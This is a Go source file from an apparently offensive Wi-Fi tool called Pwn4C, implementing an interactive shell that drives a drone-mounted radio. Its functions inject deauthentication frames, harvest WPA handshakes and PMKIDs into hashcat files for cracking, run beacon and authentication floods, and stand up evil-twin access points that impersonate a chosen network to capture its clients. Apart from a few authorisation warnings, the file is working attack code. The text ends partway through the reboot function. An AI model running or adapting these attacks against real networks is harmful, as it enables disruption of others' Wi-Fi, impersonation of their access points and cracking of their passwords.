package cmd

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/3lyly0/Pwn4C/internal/drone"
	"github.com/spf13/cobra"
	"golang.org/x/term"
)

var (
	shellTarget string
)

// shellNet is the operator's selected network from the last survey.
type shellNet struct {
	ssid    string
	bssid   string
	channel int
	hidden  bool
}

type shellState struct {
	client   *drone.ControlClient
	target   string
	in       *bufio.Reader
	nets     []drone.WirelessNetwork
	selected *shellNet
}

// readLine returns one input line without its terminator.
//
// A single bufio.Reader is shared by every prompt. The old code created a new
// bufio.Scanner whenever it saw an error, which discarded whatever the scanner
// had already buffered; the same buffered bytes also raced with the direct
// term.ReadPassword read on the password prompt. One reader, one source of
// truth.
func (s *shellState) readLine() (string, error) {
	line, err := s.in.ReadString('\n')
	if err != nil && line == "" {
		return "", err
	}
	return strings.TrimRight(line, "\r\n"), nil
}

// readPassword reads a secret line. If the shared reader still holds typed-ahead
// input, that is consumed so nothing is lost; otherwise echo is disabled for
// the duration of the read.
func (s *shellState) readPassword() (string, error) {
	if s.in.Buffered() > 0 {
		return s.readLine()
	}
	raw, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	// Never trim spaces: a WPA passphrase may legitimately contain them.
	return strings.TrimRight(string(raw), "\r\n"), nil
}

var shellCmd = &cobra.Command{
	Use:   "shell [target_ip]",
	Short: "Interactive menu for everything the drone can do, in one session",
	Long: `Opens a single control session and drives the whole drone from a numbered
menu — survey networks, pick one, join it, listen to it, deauth it, harvest its
handshake — without juggling separate commands and reconnects.

Inside the menu, actions that need a network operate on the selected one
(use 'networks' then 'use <#>').`,
	Args: cobra.MaximumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		target := shellTarget
		if len(args) > 0 {
			target = args[0]
		}
		target = resolveTargetOrExit(target)

		client := connectOrExit(target)

		st := &shellState{
			client: client,
			target: target,
			in:     bufio.NewReader(os.Stdin),
		}

		status, err := client.GetStatus()
		if err == nil {
			fmt.Printf("[+] Session opened: %s @ %s (firmware %s)\n",
				status.DroneID, target, status.FirmwareVersion)
		}

		st.run()
	},
}

const shellMenu = `
  1) status       drone telemetry
  2) networks     survey nearby networks
  3) use          select a network from the last survey (# or SSID)
  4) connect      join the selected network (asks password; hidden OK)
  5) wifi         show the drone's upstream link
  6) leave        disconnect the drone from the upstream network
  7) listen       capture the selected network into a PCAP (Ctrl+C stops)
  8) deauth       deauth the selected network, then capture automatically
  9) harvest      capture a crackable handshake/PMKID, write a hashcat file
 10) clients      inventory stations (associated clients + PNL probes)
 11) flood        beacon or authentication flood (asks which)
 12) eviltwin     twin the selected network, harvest the clients it catches
 13) stop         stop monitor mode / hopping
 14) hop          hop across channels (default 1,6,11)
 15) power        set TX power (1-20 dBm)
 16) reboot       reboot the drone
  q) quit

`

func (s *shellState) run() {
	defer s.client.Close()

	for {
		fmt.Print("\n╔══ Pwn4C shell — ")
		if s.selected != nil {
			label := s.selected.ssid
			if s.selected.hidden || label == "" {
				label = "<hidden network>"
			}
			fmt.Printf("target %s · selected: %s (ch%d)", s.target, label, s.selected.channel)
		} else {
			fmt.Printf("target %s · no network selected", s.target)
		}
		fmt.Println(" ══╗")
		fmt.Print(shellMenu)
		fmt.Print("pwn4c> ")
		line, err := s.readLine()
		if err != nil {
			// Ctrl+D / closed stdin ends the session cleanly.
			fmt.Println()
			return
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if !s.dispatch(line) {
			return
		}
	}
}

// dispatch handles one menu input; returns false when the shell should exit.
func (s *shellState) dispatch(line string) bool {
	arg := ""
	if i := strings.IndexAny(line, " \t"); i >= 0 {
		arg = strings.TrimSpace(line[i+1:])
		line = line[:i]
	}
	line = strings.ToLower(line)

	switch line {
	case "1", "status":
		s.doStatus()
	case "2", "networks", "scan":
		s.doNetworks()
	case "3", "use":
		s.doUse(arg)
	case "4", "connect":
		s.doConnect()
	case "5", "wifi":
		s.doWifiStatus()
	case "6", "leave":
		s.doLeave()
	case "7", "listen":
		s.doListen(false)
	case "8", "deauth":
		s.doListen(true)
	case "9", "harvest":
		s.doHarvest()
	case "10", "clients":
		s.doClients()
	case "11", "flood":
		s.doFlood()
	case "12", "eviltwin":
		s.doEvilTwin()
	case "13", "stop":
		s.doStop()
	case "14", "hop":
		s.doHop(arg)
	case "15", "power":
		s.doPower(arg)
	case "16", "reboot":
		s.doReboot()
	case "menu", "help", "h", "?":
		// the menu prints every round already
	case "q", "quit", "exit":
		fmt.Println("[*] Closing the session (monitor mode is stopped automatically).")
		return false
	default:
		fmt.Println("[!] Unknown option — pick a number from the menu or 'quit'.")
	}
	return true
}

func (s *shellState) doStatus() {
	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("\n================ DRONE TELEMETRY ================")
	fmt.Printf(" Drone ID         : %s\n", st.DroneID)
	fmt.Printf(" Firmware         : %s\n", st.FirmwareVersion)
	fmt.Printf(" State            : %s\n", st.State)
	fmt.Printf(" Monitor Active   : %t\n", st.MonitorActive)
	fmt.Printf(" Current Channel  : %d\n", st.Channel)
	fmt.Printf(" Uptime           : %s\n",
		(time.Duration(st.UptimeSeconds) * time.Second).Round(time.Second))
	fmt.Printf(" Free RAM         : %d MB\n", st.FreeRAMBytes/(1024*1024))
	fmt.Printf(" RX / Stream      : %d / %d\n", st.RxFrames, st.TxFrames)
	if st.InjectFrames != nil {
		fmt.Printf(" Injected Frames  : %d\n", *st.InjectFrames)
	}
	fmt.Println("=================================================")
}

func (s *shellState) doNetworks() {
	fmt.Println("[*] Surveying networks (the drone sweeps channels 1-13)...")
	nets, err := s.client.ScanNetworks(4000)
	if err != nil {
		fmt.Printf("[!] Scan failed: %v\n", err)
		return
	}
	s.nets = nets
	if len(nets) == 0 {
		fmt.Println("[-] Nothing heard. Try again or move the antenna.")
		return
	}
	printNetworkTable(nets)
	fmt.Println("    Pick one with: use <# or SSID>")
}

func (s *shellState) doUse(arg string) {
	if len(s.nets) == 0 {
		fmt.Println("[!] Run 'networks' first to build the survey list.")
		return
	}
	if arg == "" {
		fmt.Print("[*] Network # or SSID (empty = cancel): ")
		typed, err := s.readLine()
		if err != nil {
			return
		}
		arg = strings.TrimSpace(typed)
		if arg == "" {
			return
		}
	}

	var pick *shellNet
	if idx, err := strconv.Atoi(arg); err == nil && idx >= 1 && idx <= len(s.nets) {
		n := s.nets[idx-1]
		pick = &shellNet{ssid: n.SSID, bssid: n.BSSID, channel: n.Channel, hidden: n.Hidden}
	} else {
		for i := range s.nets {
			if strings.EqualFold(s.nets[i].SSID, arg) || strings.EqualFold(s.nets[i].BSSID, arg) {
				n := s.nets[i]
				pick = &shellNet{ssid: n.SSID, bssid: n.BSSID, channel: n.Channel, hidden: n.Hidden}
				break
			}
		}
	}

	if pick == nil {
		fmt.Printf("[!] '%s' is not in the last survey — run 'networks' again.\n", arg)
		return
	}
	s.selected = pick
	label := pick.ssid
	if pick.hidden || label == "" {
		label = fmt.Sprintf("<hidden network, BSSID %s>", pick.bssid)
	}
	fmt.Printf("[+] Selected: %s (BSSID %s, channel %d)\n", label, pick.bssid, pick.channel)
	fmt.Println("    Available actions: connect · listen · deauth · harvest")
}

func (s *shellState) askYN(prompt string, defYes bool) bool {
	suffix := " [Y/n]: "
	if !defYes {
		suffix = " [y/N]: "
	}
	fmt.Print(prompt + suffix)
	ans, err := s.readLine()
	if err != nil {
		return false
	}
	ans = strings.ToLower(strings.TrimSpace(ans))
	if ans == "" {
		return defYes
	}
	return ans == "y" || ans == "yes"
}

func (s *shellState) doConnect() {
	ssid := ""
	if s.selected != nil {
		ssid = s.selected.ssid
	}
	fmt.Print("[*] SSID to join (empty = selected network): ")
	typed, err := s.readLine()
	if err != nil {
		return
	}
	typed = strings.TrimSpace(typed)
	if typed != "" {
		ssid = typed
	}
	if ssid == "" {
		fmt.Println("[!] No SSID — run 'networks' + 'use' first, or type a name.")
		return
	}
	hidden := s.selected != nil && (s.selected.hidden || s.selected.ssid == "") && typed == ""

	fmt.Print("[*] Password (hidden input; empty = open network): ")
	password, err := s.readPassword()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}

	if hidden {
		fmt.Printf("[*] '%s' is not visible in the air — the drone will scan for it by name.\n", ssid)
	}

	if err := s.client.WifiConnect(ssid, password, "", "", true); err != nil {
		fmt.Printf("[!] Connect failed: %v\n", err)
		return
	}

	fmt.Println("[*] Waiting for association (up to 45s)...")
	deadline := time.Now().Add(45 * time.Second)
	for time.Now().Before(deadline) {
		st, err := s.client.WifiStatus()
		if err == nil && st.Connected {
			fmt.Printf("[+] Joined '%s' — IP: %s (channel %d)\n", st.SSID, st.IP, st.Channel)
			if st.Sharing {
				fmt.Println("[+] LAN sharing active: hosts on 192.168.4.0/24 have internet via the drone.")
			}
			return
		}
		time.Sleep(2 * time.Second)
	}
	fmt.Println("[!] Association timed out. Check the password and retry; 'wifi' shows the current state.")
}

func (s *shellState) doWifiStatus() {
	st, err := s.client.WifiStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if !st.Connected {
		fmt.Println("[-] Not associated with any network.")
		return
	}
	fmt.Printf("[+] Upstream: %s (BSSID %s, ch%d, IP %s)\n", st.SSID, st.BSSID, st.Channel, st.IP)
	if st.Sharing {
		fmt.Println("[+] LAN sharing: enabled (192.168.4.0/24 NATed through the upstream link)")
	} else {
		fmt.Println("[-] LAN sharing: disabled (hosts on 192.168.4.0/24 cannot route out)")
	}
}

func (s *shellState) doLeave() {
	if err := s.client.WifiDisconnect(); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[+] Left the network; radio is back to idle (DOWN).")
}

// doListen implements both 'listen' (deauth=false) and 'deauth' (deauth=true).
// The deauth flow injects the burst and keeps the very same session listening
// for the handshake.
func (s *shellState) doListen(deauth bool) {
	channel := 6
	bssid := ""
	label := "the current channel"

	if s.selected != nil {
		channel = s.selected.channel
		bssid = s.selected.bssid
		label = fmt.Sprintf("%s (BSSID %s, ch%d)", s.selected.ssid, s.selected.bssid, s.selected.channel)
	} else {
		fmt.Printf("[*] No network selected — listening on channel %d without a BSSID filter.\n", channel)
		fmt.Print("[*] Channel to listen on (empty = 6): ")
		v, err := s.readLine()
		if err != nil {
			return
		}
		if v = strings.TrimSpace(v); v != "" {
			if ch, err := strconv.Atoi(v); err == nil && ch >= 1 && ch <= 13 {
				channel = ch
			} else {
				fmt.Println("[!] Invalid channel — staying on 6.")
			}
		}
	}

	if deauth && (bssid == "") {
		fmt.Println("[!] Deauth needs a selected network (with a BSSID). Run 'networks' + 'use' first.")
		return
	}

	defName := fmt.Sprintf("capture-%s.pcap", time.Now().Format("20060102-150405"))
	if deauth {
		defName = "handshake.pcap"
	}
	fmt.Printf("[*] Output PCAP (empty = %s): ", defName)
	typed, err := s.readLine()
	if err != nil {
		return
	}
	outPath := strings.TrimSpace(typed)
	if outPath == "" {
		outPath = defName
	}

	if deauth {
		count := 25
		fmt.Printf("[*] Deauth frame count (empty = %d): ", count)
		v, err := s.readLine()
		if err != nil {
			return
		}
		if v = strings.TrimSpace(v); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 256 {
				count = n
			}
		}

		clientMAC := "ff:ff:ff:ff:ff:ff"
		fmt.Print("[*] Target client MAC (empty = broadcast, usually ignored): ")
		v, err = s.readLine()
		if err != nil {
			return
		}
		if v = strings.TrimSpace(v); v != "" {
			if hw, err := net.ParseMAC(v); err != nil || len(hw) != 6 {
				fmt.Println("[!] Invalid client MAC — aborting.")
				return
			}
			clientMAC = v
		}
		if !isBroadcastMAC(clientMAC) && isGroupMAC(clientMAC) {
			fmt.Println("[!] That is a group/multicast MAC; use a unicast client MAC.")
			return
		}
		if isBroadcastMAC(clientMAC) {
			fmt.Println("[!] Broadcast deauth is ignored by most clients, so the capture")
			fmt.Println("    will probably contain no handshake. Prefer the client MAC.")
			fmt.Print("[*] Continue with broadcast anyway? [y/N]: ")
			v, err = s.readLine()
			if err != nil {
				return
			}
			if !strings.EqualFold(strings.TrimSpace(v), "y") {
				fmt.Println("[-] Cancelled.")
				return
			}
		}

		opts := drone.DefaultFrameOptions()
		opts.Channel = channel
		frameHex, err := drone.BuildManagementFrame(bssid, clientMAC,
			drone.ReasonClass3FromNonAssocSTA, opts)
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return
		}

		st, err := s.client.GetStatus()
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return
		}
		if !st.MonitorActive {
			if err := s.client.StartMonitor(channel); err != nil {
				fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
				return
			}
		} else if st.Channel != channel {
			if err := s.client.SetChannel(channel); err != nil {
				fmt.Printf("[!] Failed to switch channel: %v\n", err)
				return
			}
		}

		if err := s.client.SetFilter(false, bssid); err != nil {
			fmt.Printf("[!] Warning: BPF filter failed: %v\n", err)
		}

		receiver, frames := s.startReceiver(outPath)
		fmt.Printf("[+] Injecting %d deauth frames against %s...\n", count, bssid)
		txBefore, txBeforeOK := readInjectFrames(s.client)
		res, err := s.client.InjectFrame(frameHex, count, 10, 0)
		if err != nil {
			receiver.Close()
			fmt.Printf("[!] Injection failed: %v\n", err)
			return
		}
		fmt.Printf("[+] Injection queued: %d frame(s) (accepted synchronously: %d, dropped: %d, pending: %d)\n",
			res.Queued, res.Sent, res.Failed, res.Pending)
		if res.Failed > 0 {
			fmt.Printf("[!] %d frame(s) were dropped by the drone TX ring (max %d).\n",
				res.Failed, res.QueueMax)
		}
		if res.Pending > 0 {
			if err := waitForTxDrain(s.client, 10*time.Second); err != nil {
				receiver.Close()
				fmt.Printf("[!] Lost contact with the drone during TX: %v\n", err)
				fmt.Println("    It may have reset — run `pwn4c discover` and check its uptime.")
				return
			}
		}
		reportTxDelta(s.client, txBefore, txBeforeOK, res.Sent+res.Pending)
		fmt.Println("[+] Deauth sent — listening for reconnections and handshakes.")
		fmt.Printf("    Capturing %s -> %s\n", label, outPath)
		fmt.Println("    Press Ctrl+C to stop.")

		waitForInterrupt()

		fmt.Println("\n[*] Stopping capture...")
		receiver.Close()
		_ = s.client.SetFilter(false, "")
		s.stopMonitorQuietly()
		fmt.Printf("[+] Capture saved: %s\n", outPath)
		reportCapture(frames.Load())
		fmt.Println("    wireshark -r " + outPath + "   (filter: eapol || wlan.fc.type_subtype == 0x0c)")
		return
	}

	// Plain listen
	receiver, frames := s.startReceiver(outPath)
	fmt.Printf("[+] Entering monitor mode on channel %d", channel)
	if bssid != "" {
		fmt.Printf(" (BSSID filter %s)", bssid)
	}
	fmt.Println()
	if err := s.client.StartMonitor(channel); err != nil {
		receiver.Close()
		fmt.Printf("[!] Failed to start monitor: %v\n", err)
		return
	}
	if bssid != "" {
		if err := s.client.SetFilter(false, bssid); err != nil {
			fmt.Printf("[!] Warning: BPF filter failed: %v\n", err)
		}
	} else if err := s.client.SetFilter(false, ""); err != nil {
		fmt.Printf("[!] Warning: failed to clear inherited BPF filter: %v\n", err)
	}
	fmt.Printf("    Capturing %s -> %s\n", label, outPath)
	fmt.Println("    Press Ctrl+C to stop.")

	waitForInterrupt()

	fmt.Println("\n[*] Stopping capture...")
	receiver.Close()
	_ = s.client.SetFilter(false, "")
	s.stopMonitorQuietly()
	fmt.Printf("[+] Capture saved: %s\n", outPath)
	reportCapture(frames.Load())
}

// doHarvest captures a crackable handshake or PMKID and writes a hashcat 22000
// file. It is the in-session twin of `pwn4c harvest`: same daemon table, same
// output, but no reconnect and no exit — the shell keeps the radio as it found
// it.
func (s *shellState) doHarvest() {
	channel := 6
	bssid := ""

	if s.selected != nil {
		channel = s.selected.channel
		bssid = s.selected.bssid
		fmt.Printf("[*] Harvesting %s (BSSID %s, ch%d).\n",
			s.selected.ssid, s.selected.bssid, s.selected.channel)
	} else {
		fmt.Printf("[*] No network selected — harvesting on channel %d without a BSSID filter.\n", channel)
		fmt.Print("[*] Channel to harvest on (empty = 6): ")
		v, err := s.readLine()
		if err != nil {
			return
		}
		if v = strings.TrimSpace(v); v != "" {
			if ch, err := strconv.Atoi(v); err == nil && ch >= 1 && ch <= 13 {
				channel = ch
			} else {
				fmt.Println("[!] Invalid channel — staying on 6.")
			}
		}
	}

	timeout := 120
	fmt.Printf("[*] Give up after N seconds (empty = %d): ", timeout)
	v, err := s.readLine()
	if err != nil {
		return
	}
	if v = strings.TrimSpace(v); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 3600 {
			timeout = n
		} else {
			fmt.Printf("[!] Invalid timeout — using %ds.\n", timeout)
		}
	}

	kick := false
	if bssid != "" {
		kick = s.askYN("[*] Kick associated clients with a deauth burst first?", false)
	}

	fmt.Print("[*] Output file (empty = hs.hc22000): ")
	v, err = s.readLine()
	if err != nil {
		return
	}
	outPath := strings.TrimSpace(v)
	if outPath == "" {
		outPath = "hs.hc22000"
	}

	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}

	weStarted := false
	switch {
	case !st.MonitorActive:
		if err := s.client.StartMonitor(channel); err != nil {
			fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
			return
		}
		weStarted = true
	default:
		if st.Channel != channel {
			if err := s.client.SetChannel(channel); err != nil {
				fmt.Printf("[!] Failed to switch channel: %v\n", err)
				return
			}
		}
		// START_MONITOR clears the table; a channel switch does not, and a
		// running session may already hold units from an earlier run.
		if _, err := s.client.GetHandshakes(0, true); err != nil {
			fmt.Printf("[!] Warning: failed to reset the handshake table: %v\n", err)
		}
	}

	// A BSSID filter from an earlier listen session survives a monitor restart
	// inside the daemon. Clear it so beacons from every AP are seen: the ESSID
	// is required to build the hashcat line.
	if err := s.client.SetFilter(false, ""); err != nil {
		fmt.Printf("[!] Warning: failed to clear the frame filter: %v\n", err)
	}

	if kick {
		fmt.Println("[*] Using a broadcast deauth — clients that ignore it will not re-handshake.")
		runHarvestDeauth(s.client, bssid, "ff:ff:ff:ff:ff:ff", channel, 5)
	}

	units := collectHandshakes(s.client, channel, bssid, timeout, false)

	// Only restore the radio if this action started the monitor session: a
	// session the operator already had running stays up.
	if weStarted {
		s.stopMonitorQuietly()
	}

	if len(units) == 0 {
		fmt.Println("[!] No handshake captured.")
		printHarvestHints()
		return
	}
	if err := writeHarvest(units, outPath); err != nil {
		fmt.Printf("[!] %v\n", err)
	}
}

// doClients inventories the stations around the selected network (or a channel
// the operator types) and prints them as a table, reusing the CLI's collectors
// so the shell and the standalone command agree.
func (s *shellState) doClients() {
	channel := 6

	if s.selected != nil {
		channel = s.selected.channel
		fmt.Printf("[*] Inventorying stations around %s (BSSID %s, ch%d).\n",
			s.selected.ssid, s.selected.bssid, s.selected.channel)
	} else {
		fmt.Printf("[*] No network selected — listening on channel %d.\n", channel)
		fmt.Print("[*] Channel to listen on (empty = 6): ")
		v, err := s.readLine()
		if err != nil {
			return
		}
		if v = strings.TrimSpace(v); v != "" {
			if ch, err := strconv.Atoi(v); err == nil && ch >= 1 && ch <= 13 {
				channel = ch
			} else {
				fmt.Println("[!] Invalid channel — staying on 6.")
			}
		}
	}

	seconds := 20
	fmt.Printf("[*] Listen for N seconds (empty = %d): ", seconds)
	v, err := s.readLine()
	if err != nil {
		return
	}
	if v = strings.TrimSpace(v); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 3600 {
			seconds = n
		} else {
			fmt.Printf("[!] Invalid duration — using %ds.\n", seconds)
		}
	}

	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}

	weStarted := false
	if !st.MonitorActive {
		if err := s.client.StartMonitor(channel); err != nil {
			fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
			return
		}
		weStarted = true
	} else if st.Channel != channel {
		if err := s.client.SetChannel(channel); err != nil {
			fmt.Printf("[!] Failed to switch channel: %v\n", err)
			return
		}
	}

	// A BSSID filter from an earlier listen session would hide every other
	// station; the inventory wants the whole channel.
	if err := s.client.SetFilter(false, ""); err != nil {
		fmt.Printf("[!] Warning: failed to clear the frame filter: %v\n", err)
	}

	// A running session may already hold stations from an earlier run.
	if _, err := s.client.GetClients(0, true); err != nil {
		fmt.Printf("[!] Warning: failed to reset the client table: %v\n", err)
	}

	stations := collectClients(s.client, channel, seconds)

	if weStarted {
		s.stopMonitorQuietly()
	}

	stations = filterClients(stations)
	if len(stations) == 0 {
		fmt.Println("[-] No stations heard.")
		fmt.Println("    Try a longer listen or another channel ('pwn4c networks').")
		return
	}
	printClientTable(stations, channel)
}

// doFlood runs a beacon or authentication flood from inside the session,
// reusing the CLI's frame builders and pacing loop.
func (s *shellState) doFlood() {
	kind := "beacon"
	fmt.Print("[*] Flood type — [b]eacon or [a]uth (empty = beacon): ")
	v, err := s.readLine()
	if err != nil {
		return
	}
	if strings.HasPrefix(strings.ToLower(strings.TrimSpace(v)), "a") {
		kind = "auth"
	}

	channel := 6
	bssid := ""
	if s.selected != nil {
		channel = s.selected.channel
		bssid = s.selected.bssid
	}
	fmt.Printf("[*] Channel to flood (empty = %d): ", channel)
	v, err = s.readLine()
	if err != nil {
		return
	}
	if v = strings.TrimSpace(v); v != "" {
		if ch, err := strconv.Atoi(v); err == nil && ch >= 1 && ch <= 13 {
			channel = ch
		} else {
			fmt.Println("[!] Invalid channel — staying on", channel)
		}
	}

	count := 1000
	if kind == "auth" {
		count = 500
	}
	fmt.Printf("[*] Frames to send (empty = %d, 0 = until Ctrl+C): ", count)
	v, err = s.readLine()
	if err != nil {
		return
	}
	if v = strings.TrimSpace(v); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 && n <= 10_000_000 {
			count = n
		} else {
			fmt.Printf("[!] Invalid count — using %d.\n", count)
		}
	}

	if kind == "auth" {
		if bssid == "" {
			fmt.Print("[*] Target AP BSSID: ")
			v, err = s.readLine()
			if err != nil {
				return
			}
			bssid = strings.TrimSpace(v)
		}
		if _, err := net.ParseMAC(bssid); err != nil {
			fmt.Printf("[!] Invalid BSSID %q.\n", bssid)
			return
		}
		fmt.Println("[!] This is a denial-of-service test: it fills the AP's")
		fmt.Println("    authentication state table. Only run it against hardware you own.")
	}

	opts := drone.DefaultFrameOptions()
	opts.Channel = channel

	var build func(i int) (string, error)
	label := "beacon"
	if kind == "auth" {
		label = "authentication"
		build = func(i int) (string, error) {
			return drone.BuildAuthFrame(drone.AuthParams{
				BSSID:   bssid,
				Client:  drone.RandomMAC(),
				Seq:     uint16(i & 0x0fff),
				Options: opts,
			})
		}
	} else {
		build = func(i int) (string, error) {
			return drone.BuildBeaconFrame(drone.BeaconParams{
				BSSID:   drone.RandomMAC(),
				SSID:    drone.RandomSSID(),
				Seq:     uint16(i & 0x0fff),
				Options: opts,
			})
		}
	}

	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}

	weStarted := false
	if !st.MonitorActive {
		if err := s.client.StartMonitor(channel); err != nil {
			fmt.Printf("[!] Failed to enter monitor mode: %v\n", err)
			return
		}
		weStarted = true
	} else if st.Channel != channel {
		if err := s.client.SetChannel(channel); err != nil {
			fmt.Printf("[!] Failed to switch channel: %v\n", err)
			return
		}
	}
	if err := s.client.SetFilter(false, ""); err != nil {
		fmt.Printf("[!] Warning: failed to clear the frame filter: %v\n", err)
	}

	sent, failed, err := runFlood(s.client, floodOptions{
		label:   label,
		channel: channel,
		total:   count,
		rate:    1,
		build:   build,
	})

	if weStarted {
		s.stopMonitorQuietly()
	}

	fmt.Println()
	fmt.Printf("[+] Injection: %d %s frame(s) on air, %d dropped\n", sent, label, failed)
	if err != nil {
		fmt.Printf("[!] %v\n", err)
	}
}

// doEvilTwin twins the selected network (or a real AP the operator identifies)
// and captures what its clients send it. It reuses the CLI's session runner so
// the shell and `pwn4c eviltwin` behave identically: same monitor ownership
// rules, same handshake polling, same hashcat output.
func (s *shellState) doEvilTwin() {
	channel := 6
	bssid := ""
	ssid := ""

	if s.selected != nil {
		channel = s.selected.channel
		bssid = s.selected.bssid
		ssid = s.selected.ssid
		fmt.Printf("[*] Twinning %s (BSSID %s, ch%d).\n",
			ssid, s.selected.bssid, s.selected.channel)
	} else {
		fmt.Println("[*] No network selected — the twin needs the real AP's identity.")
		fmt.Print("[*] Real AP BSSID: ")
		v, err := s.readLine()
		if err != nil {
			return
		}
		bssid = strings.TrimSpace(v)
		fmt.Print("[*] SSID the twin advertises: ")
		v, err = s.readLine()
		if err != nil {
			return
		}
		ssid = strings.TrimSpace(v)
		fmt.Print("[*] Channel of the real AP (empty = 6): ")
		v, err = s.readLine()
		if err != nil {
			return
		}
		if v = strings.TrimSpace(v); v != "" {
			if ch, err := strconv.Atoi(v); err == nil && ch >= 1 && ch <= 13 {
				channel = ch
			} else {
				fmt.Println("[!] Invalid channel — staying on 6.")
			}
		}
	}

	// The same validation the CLI runs before it opens a connection: fail
	// here, with the reason, instead of half-way through the session.
	if err := drone.ValidateRogueAPParams(drone.RogueAPParams{
		SSID:       ssid,
		BSSID:      bssid,
		Channel:    channel,
		Passphrase: "",
	}); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}

	fmt.Printf("[!] The twin impersonates %s. Only use it on networks you own\n", bssid)
	fmt.Println("    or are explicitly authorized to test.")

	fmt.Print("[*] WPA2 passphrase for the twin (hidden input; empty = open twin): ")
	passphrase, err := s.readPassword()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	// Never trim: a passphrase may legitimately contain spaces.

	hidden := s.askYN("[*] Hide the twin's SSID?", false)

	kick := s.askYN("[*] Deauth clients off the real AP so they rescan?", false)

	duration := 0
	fmt.Print("[*] Stop after N seconds (empty = until Ctrl+C): ")
	v, err := s.readLine()
	if err != nil {
		return
	}
	if v = strings.TrimSpace(v); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 && n <= 86_400 {
			duration = n
		} else {
			fmt.Println("[!] Invalid duration — running until Ctrl+C.")
		}
	}

	fmt.Print("[*] Output file (empty = eviltwin.hc22000): ")
	v, err = s.readLine()
	if err != nil {
		return
	}
	outPath := strings.TrimSpace(v)
	if outPath == "" {
		outPath = "eviltwin.hc22000"
	}

	units, sessionErr := runEvilTwinSession(s.client, evilTwinOptions{
		ssid:       ssid,
		bssid:      bssid,
		channel:    channel,
		passphrase: passphrase,
		hidden:     hidden,
		kick:       kick,
		kickCount:  8,
		duration:   time.Duration(duration) * time.Second,
	})
	// runEvilTwinSession stops the twin and any monitor it started; a session
	// the operator already had running stays up.

	if len(units) == 0 {
		fmt.Println("[!] No handshake captured.")
		printEvilTwinHints(passphrase != "")
		if sessionErr != nil {
			fmt.Printf("[!] %v\n", sessionErr)
		}
		return
	}
	if err := writeHarvest(units, outPath); err != nil {
		fmt.Printf("[!] %v\n", err)
	}
}

// stopMonitorQuietly restores the radio after a listen session. Leaving monitor
// mode on would keep the single radio unavailable for 'connect'/'wifi', and a
// stale capture vif makes netifd create phy0-ap1 on the next restart.
func (s *shellState) stopMonitorQuietly() {
	if err := s.client.StopMonitor(); err != nil {
		fmt.Printf("[!] Warning: failed to stop monitor mode: %v\n", err)
	}
}

// reportCapture flags a capture window that produced no frames at all. A live
// monitor interface on a busy channel always yields beacons, so zero frames
// means the radio (not a filter) is the problem — usually a wedge or a reset.
func reportCapture(frames uint64) {
	if frames > 0 {
		return
	}
	fmt.Println("[!] 0 frames captured — the monitor interface produced nothing.")
	fmt.Println("    The drone's radio may have wedged or reset; check `pwn4c discover`.")
}

func (s *shellState) startReceiver(outPath string) (*drone.FrameReceiver, *atomic.Uint64) {
	var frames atomic.Uint64
	receiver, err := drone.StartStreamReceiver(drone.DefaultStreamPort, outPath, func(seq uint32, frame []byte) {
		n := frames.Add(1)
		if n == 1 || n%50 == 0 {
			fmt.Printf("\r[+] Captured %d frames...", n)
		}
	})
	if err != nil {
		fmt.Printf("[!] Failed to bind UDP stream receiver: %v\n", err)
		os.Exit(1)
	}
	return receiver, &frames
}

func (s *shellState) doStop() {
	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if !st.MonitorActive {
		fmt.Println("[-] Monitor mode is not active.")
		return
	}
	_ = s.client.StopHop()
	if err := s.client.StopMonitor(); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Println("[+] Monitor mode stopped; radio restored.")
}

func (s *shellState) doHop(arg string) {
	channels := []int{1, 6, 11}
	if arg != "" {
		parsed, err := parseChannelList(arg)
		if err != nil {
			fmt.Printf("[!] %v\n", err)
			return
		}
		channels = parsed
	}
	st, err := s.client.GetStatus()
	if err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	if !st.MonitorActive {
		if err := s.client.StartMonitor(channels[0]); err != nil {
			fmt.Printf("[!] Failed to start monitor: %v\n", err)
			return
		}
	}
	if err := s.client.StartHop(channels, 250); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("[+] Hopping across %v (250ms dwell). 'stop' ends it.\n", channels)
}

func (s *shellState) doPower(arg string) {
	if arg == "" {
		fmt.Print("[*] TX power in dBm (1-20, empty = cancel): ")
		v, err := s.readLine()
		if err != nil {
			return
		}
		arg = strings.TrimSpace(v)
		if arg == "" {
			return
		}
	}
	dbm, err := strconv.Atoi(arg)
	if err != nil || dbm < 1 || dbm > 20 {
		fmt.Println("[!] Power must be 1-20.")
		return
	}
	if err := s.client.SetTxPower(dbm); err != nil {
		fmt.Printf("[!] %v\n", err)
		return
	}
	fmt.Printf("[+] TX power set to %d dBm.\n", dbm)
}

func (s *shellState) doReboot() {
	if !s.askYN("[*] Reboot the drone now?", false) {
		return
	}
